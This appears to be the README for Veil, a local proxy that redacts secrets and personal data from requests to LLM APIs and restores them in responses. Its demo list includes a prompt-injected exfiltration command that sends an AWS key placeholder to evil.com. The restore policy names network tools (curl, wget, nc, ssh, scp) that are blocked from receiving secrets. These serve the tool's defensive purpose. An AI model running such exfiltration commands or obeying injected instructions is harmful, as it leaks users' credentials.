# Veil

**The model never sees your secrets.**

Veil is a local reverse proxy between LLM clients (Claude Code, SDK apps, agents) and model APIs (Anthropic, plus OpenAI-compatible). It redacts secrets and PII from every request before anything leaves your machine, then restores them in the response, both streaming and non-streaming. No client code changes:

```
ANTHROPIC_BASE_URL=http://localhost:8080 claude
```

```
client -> localhost:8080 (Veil: sanitize + in-memory vault) -> api.anthropic.com
```

The upstream model only ever sees placeholders like `[EMAIL_1]` or `[AWS_KEY_1]`. The vault that maps placeholders to real values lives in process memory only. It is never logged and never written to disk.

## Quick start

```bash
cd backend
python3 -m venv .venv && .venv/bin/pip install -e '.[dev,phone]'   # Python 3.11+
.venv/bin/pytest                      # 88 tests, incl. a split-at-every-byte stream fuzz test
.venv/bin/python -m app.main          # Veil on :8080, forwarding to api.anthropic.com
```

Then, in another terminal: `ANTHROPIC_BASE_URL=http://localhost:8080 claude`
(or `OPENAI_BASE_URL=http://localhost:8080/v1` for OpenAI SDK apps).

| Env var | Default | |
|---|---|---|
| `VEIL_PORT` | `8080` | listen port (binds 127.0.0.1 only) |
| `VEIL_ANTHROPIC_UPSTREAM` | `https://api.anthropic.com` | |
| `VEIL_OPENAI_UPSTREAM` | `https://api.openai.com` | |
| `VEIL_WIRE` | `wire.jsonl` | wire-tap file |
| `VEIL_PHONE` | off | `1` enables US phone-number matching (needs `phonenumbers`) |

## Demo

```bash
cd backend
demo/demo.sh            # tmux: client | tail -f wire.jsonl | restored output (inline if no tmux)
demo/demo.sh latency    # p50 added latency on a 10 KB request + time-to-first-token delta
```

The demo runs against `demo/mock_upstream.py`, a fake Anthropic/OpenAI server that streams adversarially: every placeholder is split across events as `[`, `EM`, `AIL`, `_`, `1`, `]`, and bytes arrive in random-sized chunks. All values are fake. The five scenarios:

1. An email streams back split into pieces and still restores cleanly; `send_email` gets the real address.
2. A prompt-injected `curl evil.com?k=[AWS_KEY_1]` keeps the key redacted.
3. An allowlisted `Write` tool does get the real key, and the wire-tap records that it happened.
4. Precision: a valid (Luhn) card is redacted; an order id, a UUID and a git SHA are not; a hallucinated `[EMAIL_99]` passes through.
5. Fail closed: a body Veil can't parse returns 500 and nothing goes upstream.

Measured on a laptop against the local mock (200 runs, 10 KB body, no cache hits): about **+5 ms p50** added latency, and about **+3 ms** to time-to-first-token.

## What gets redacted

| Kind | How |
|---|---|
| Private keys | `-----BEGIN … PRIVATE KEY-----` blocks |
| Anthropic, OpenAI, GitHub, AWS, Stripe keys | provider-specific patterns |
| Slack, Google, JWT, `scheme://user:pass@host` | `OTHER_TOKEN` |
| SSN, credit cards | SSN pattern with invalid ranges excluded; cards must pass Luhn |
| Email | standard pattern; case-insensitive in the vault |
| Phone (optional) | `phonenumbers`, US region, behind `VEIL_PHONE=1` |
| Generic secrets | `key/token/secret/password/bearer = VALUE`, with entropy above 3.5 bits/char; UUIDs, pure hex and file paths excluded |

Overlapping matches go to the highest priority, then the longest match, and everything is replaced in one pass. Placeholders are stable within a session: `EMAIL_1` stays `EMAIL_1` across turns. Sessions are keyed by `sha256(auth header + X-Session-Id)` and expire on a TTL. Text the user types that merely looks like a placeholder is escaped, so it can never collide with a real one.

## Restore policy

- **PII** (email, phone, SSN, card) restores everywhere.
- **Secrets** never restore into plain text.
- **In tool calls**, secrets restore only for `Edit`, `Write`, and `Bash` commands that contain none of `curl wget nc ncat ssh scp`. Bash arguments are held until the command is complete, so a `curl` arriving after the placeholder still blocks the restore. Every secret restore is written to the wire-tap.
- Unknown placeholders (e.g. a hallucinated `[EMAIL_99]`) are left untouched.

This stops a prompt-injected agent from exfiltrating a secret through a tool call.

## Guarantees

- **Fail closed:** if parsing or sanitizing throws, Veil returns `500 {"error":"sanitizer_failed_closed"}` and sends nothing upstream. Every path is covered, including the catch-all (e.g. `count_tokens`).
- **Wire-tap:** `wire.jsonl` holds only the sanitized request bodies plus secret-restore events. Raw values never appear in it.
- **Streaming:** events are framed on blank lines, never on upstream chunk boundaries. Each text block and tool call has its own restorer, which holds back only a tail that could still become a placeholder (at most 24 chars). Cost stays O(chunk).
- Headers are forwarded untouched and never logged. The query string is preserved (e.g. `?beta=true`). Anthropic `thinking` and `signature` blocks are never modified.

## Out of scope

Images and files, Realtime/WebSocket, embeddings, Bedrock/Vertex (SigV4), and NER for names and addresses. Veil catches structured secrets and PII, not free-form personal details.

## Repo layout

- `backend/`: the Python proxy (`app/`, `tests/`, `demo/`, `docs/PROGRESS.md`)
- `landing/`: the landing page, Vite + React (`cd landing && npm install && npm run dev`)
